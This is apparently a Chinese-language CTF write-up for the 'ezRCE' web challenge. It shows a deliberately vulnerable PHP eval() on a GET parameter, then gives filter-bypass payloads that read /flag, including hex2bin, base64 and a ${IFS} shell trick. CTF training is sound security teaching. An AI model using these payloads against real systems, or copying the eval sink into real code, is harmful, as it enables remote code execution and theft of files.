---
title: ezRCE
author: SMJB
difficulty: Normal
category: Web
image: ghcr.io/svuctf/svuctf-helloworld-2024/ez_rce:latest
port: 80
writeup_author: 13m0n4de
tags:
  - php
  - rce
  - bypass
reference:
---

# ezRCE

## 题目描述

## 题目解析

### 源码分析

```php
<?php

highlight_file(__FILE__);

if (isset($_GET["rce"])) {
    if (preg_match("/flag|\\s/im", $_GET['rce'])) {
        die("hacker!");
    }
    eval($_GET['rce']);
}
```

这题相对于 [babyRCE](../rce/README.md) 来说，增加了一个 if 语句，使用正则表达式判断是否包含 `flag` 字符串或空白字符：

也就是增加了两个限制：

1. 禁用 "flag" 关键词：
    - `/flag/` 正则会匹配任何包含 `flag` 的字符串
    - 不区分大小写（由 `i` 修饰符控制）
    - 不能直接使用 `readfile('/flag')` 这样的命令了
1. 禁用空白字符：
    - `\s` 正则会匹配任何空白字符（包括空格、制表符、换行符等）
    - 不能像之前那样直接写 `system("ls -la")` 或 `system("cat /flag")` 了

### 绕过方法

可以利用字符串拼接来绕过：

```php
readfile("/f"."lag");
```

可以使用十六进制字符串转换绕过：

```php
readfile(hex2bin('2f666c6167'));
```

可以使用 Base64 解码绕过：

```php
readfile(base64_decode('L2ZsYWc='));
```

在执行系统命令时，可以使用 Shell 特性绕过：

```php
system('cat${IFS}/f*');
```

IFS (Internal Field Separator) 是特殊的 Shell 变量，决定了 Bash 在分割字符串序列时如何识别单词边界。它的默认值是一个由空格、制表符和换行符组成的三个字符的字符串，所以能在这里用作命令分割。

星号 `*` 是[通配符](https://zh.wikipedia.org/zh-hans/%E9%80%9A%E9%85%8D%E7%AC%A6)的一种，可以匹配任意数量的任意字符，于是 `/f*` 可以匹配到 `/flag` 文件。

方法还蛮多的。
